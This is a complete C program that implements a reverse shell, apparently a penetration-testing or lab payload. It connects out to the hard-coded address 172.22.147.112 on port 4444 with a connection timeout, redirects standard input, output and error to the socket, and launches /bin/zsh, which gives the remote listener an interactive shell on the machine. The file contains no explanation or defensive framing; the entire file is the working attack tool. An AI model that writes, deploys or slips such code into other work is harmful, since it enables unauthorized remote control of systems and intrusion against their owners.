#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>

int main(void) {
    int port = 4444;
    struct sockaddr_in revsockaddr;
    memset(&revsockaddr, 0, sizeof(revsockaddr));

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    if (sockt < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);

    int rc = inet_pton(AF_INET, "172.22.147.112", &revsockaddr.sin_addr);
    if (rc <= 0) {
        perror("inet_pton");
        close(sockt);
        exit(EXIT_FAILURE);
    }

    int flags = fcntl(sockt, F_GETFL, 0);
    if (flags < 0) {
        perror("fcntl F_GETFL failed");
        close(sockt);
        exit(EXIT_FAILURE);
    }

    if (fcntl(sockt, F_SETFL, flags | O_NONBLOCK) < 0) {
        perror("fcntl F_SETFL failed");
        close(sockt);
        exit(EXIT_FAILURE);
    }

    rc = connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr));
    if (rc < 0 && errno != EINPROGRESS) {
        perror("connect failed");
        close(sockt);
        exit(EXIT_FAILURE);
    }

    if (rc < 0 && errno == EINPROGRESS) {
        fd_set wfds;
        struct timeval tv;
        FD_ZERO(&wfds);
        FD_SET(sockt, &wfds);
        tv.tv_sec = 25;
        tv.tv_usec = 0;

        rc = select(sockt + 1, NULL, &wfds, NULL, &tv);
        if (rc == 0) {
            fprintf(stderr, "connect timed out after 25 seconds\n");
            close(sockt);
            exit(EXIT_FAILURE);
        } else if (rc < 0) {
            perror("select failed");
            close(sockt);
            exit(EXIT_FAILURE);
        } else {
            int so_error = 0;
            socklen_t len = sizeof(so_error);
            if (getsockopt(sockt, SOL_SOCKET, SO_ERROR, &so_error, &len) < 0) {
                perror("getsockopt failed");
                close(sockt);
                exit(EXIT_FAILURE);
            }
            if (so_error != 0) {
                errno = so_error;
                perror("connect failed");
                close(sockt);
                exit(EXIT_FAILURE);
            }
        }
    }

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/zsh", NULL};
    execve("/bin/zsh", argv, NULL);



    // If execve fails
    perror("execve failed");
    close(sockt);
    return EXIT_FAILURE;

    close(sockt);
    return EXIT_SUCCESS;
}
